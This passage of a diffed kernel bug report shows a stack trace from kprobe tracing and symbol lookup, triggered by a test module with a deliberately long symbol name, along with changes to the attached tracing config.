+[   33.288399]  sized_strscpy+0x248/0x2f0
+[   33.288419]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[   33.288454]  module_address_lookup+0xdc/0x130
+[   33.288477]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[   33.288511]  kallsyms_lookup_buildid+0x157/0x1e0
+[   33.288531]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[   33.288565]  __sprint_symbol.isra.0+0xd9/0x1f0
+[   33.288584]  ? __pfx___sprint_symbol.isra.0+0x10/0x10
+[   33.288603]  ? __asan_memcpy+0x3c/0x60
+[   33.288617]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.288633]  ? __sprint_symbol.isra.0+0x151/0x1f0
+[   33.288651]  ? __pfx___sprint_symbol.isra.0+0x10/0x10
+[   33.288670]  ? __pfx_a+0x10/0x10 [helper]
+[   33.288685]  ? copy_from_kernel_nofault+0x81/0x200
+[   33.288708]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.288724]  ? copy_from_kernel_nofault_allowed+0x98/0xd0
+[   33.288747]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[   33.288782]  process_fetch_insn+0x8c2/0x1990
+[   33.288800]  ? __pfx_process_fetch_insn+0x10/0x10
+[   33.288817]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.288833]  ? rb_move_tail+0x433/0x1830
+[   33.288855]  ? __pfx_this_is_an_intentionally_very_long_symbol_name_used_t=
+o_make_the_symbol_string_expand_between_the_traceprobe_size_and_store_passes_=
+abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvw=
+xyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrs=
+tuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmnopqrstuvwxyz_abcdefghijklmno=
+pqrstuvwxyz_abcdefghijklmnopqrstuvwxyz+0x10/0x10 [helper]
+[   33.288893]  ? __pfx_rb_move_tail+0x10/0x10
+[   33.288916]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.288933]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.288948]  ? sched_clock+0x29/0x50
+[   33.288969]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.288985]  ? __rb_reserve_next.constprop.0+0x62d/0x1480
+[   33.289013]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.289029]  ? ring_buffer_lock_reserve+0x56d/0xfa0
+[   33.289046]  ? __pfx_ring_buffer_lock_reserve+0x10/0x10
+[   33.289069]  ? __entry_text_end+0xfdff5/0x1020f9
+[   33.289094]  ? handle_bug+0x184/0x2a0
+[   33.289111]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.289127]  ? ring_buffer_event_data+0xc9/0x120
+[   33.289146]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.289162]  ? trace_event_buffer_lock_reserve+0x3f3/0x6d0
+[   33.289182]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.289198]  ? ring_buffer_event_data+0xc9/0x120
+[   33.289216]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.289232]  ? trace_event_buffer_reserve+0x250/0x320
+[   33.289247]  kprobe_trace_func+0x3a6/0x700
+[   33.289267]  ? __pfx_kprobe_trace_func+0x10/0x10
+[   33.289286]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.289302]  ? preempt_schedule_notrace+0x4b/0x80
+[   33.289325]  kprobe_dispatcher+0xf0/0x120
+[   33.289342]  ? symrace_probe_point+0x4/0x20 [helper]
+[   33.289357]  kprobe_ftrace_handler+0x2bf/0x420
+[   33.289373]  ? symrace_probe_point+0x9/0x20 [helper]
+[   33.289388]  ? __pfx_kprobe_dispatcher+0x10/0x10
+[   33.289405]  ? __pfx_trigger_fn+0x10/0x10 [helper]
+[   33.289421]  0xffffffffa04010da
+[   33.289431]  ? __pfx_trigger_fn+0x10/0x10 [helper]
+[   33.289449]  ? trigger_fn+0x95/0xe0 [helper]
+[   33.289464]  ? symrace_probe_point+0x5/0x20 [helper]
+[   33.289481]  symrace_probe_point+0x9/0x20 [helper]
+[   33.289496]  trigger_fn+0xa1/0xe0 [helper]
+[   33.289512]  kthread+0x2fe/0x400
+[   33.289525]  ? recalc_sigpending+0x18c/0x220
+[   33.289541]  ? __pfx_kthread+0x10/0x10
+[   33.289555]  ret_from_fork+0x3f7/0x680
+[   33.289570]  ? __pfx_ret_from_fork+0x10/0x10
+[   33.289586]  ? srso_alias_return_thunk+0x5/0xfbef5
+[   33.289602]  ? __switch_to+0x743/0xf60
+[   33.289622]  ? __pfx_kthread+0x10/0x10
+[   33.289636]  ret_from_fork_asm+0x1a/0x30
+[   33.289660]  </TASK>
 
---===============3053206820710942250==
+--===============5575217477510584208==
 Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 Content-Disposition: attachment; filename="config"
@@ -7332,9 +6702,10 @@ CONFIG_BPF_EVENTS=3Dy
 CONFIG_DYNAMIC_EVENTS=3Dy
 CONFIG_PROBE_EVENTS=3Dy
 CONFIG_FTRACE_MCOUNT_USE_CC=3Dy
-# CONFIG_SYNTH_EVENTS is not set
-# CONFIG_USER_EVENTS is not set
-# CONFIG_HIST_TRIGGERS is not set
+CONFIG_TRACING_MAP=3Dy
+CONFIG_SYNTH_EVENTS=3Dy
+CONFIG_USER_EVENTS=3Dy
+CONFIG_HIST_TRIGGERS=3Dy
 # CONFIG_TRACE_EVENT_INJECT is not set
 # CONFIG_TRACEPOINT_BENCHMARK is not set
 # CONFIG_RING_BUFFER_BENCHMARK is not set
@@ -7347,7 +6718,9 @@ CONFIG_FTRACE_MCOUNT_USE_CC=3Dy
 # CONFIG_RING_BUFFER_VALIDATE_TIME_DELTAS is not set
 # CONFIG_RING_BUFFER_PERSISTENT_INJECT is not set
 # CONFIG_PREEMPTIRQ_DELAY_TEST is not set
+# CONFIG_SYNTH_EVENT_GEN_TEST is not set
 # CONFIG_KPROBE_EVENT_GEN_TEST is not set
+# CONFIG_HIST_TRIGGERS_DEBUG is not set
 # CONFIG_RV is not set
 # CONFIG_TRACE_REMOTE_TEST is not set
 CONFIG_PROVIDE_OHCI1394_DMA_INIT=3Dy
@@ -7447,4 +6820,4 @@ CONFIG_ARCH_USE_MEMTEST=3Dy
 CONFIG_IO_URING_ZCRX=3Dy
 CONFIG_IO_URING_BPF=3Dy
 
---===============3053206820710942250==--
+--===============5575217477510584208==--
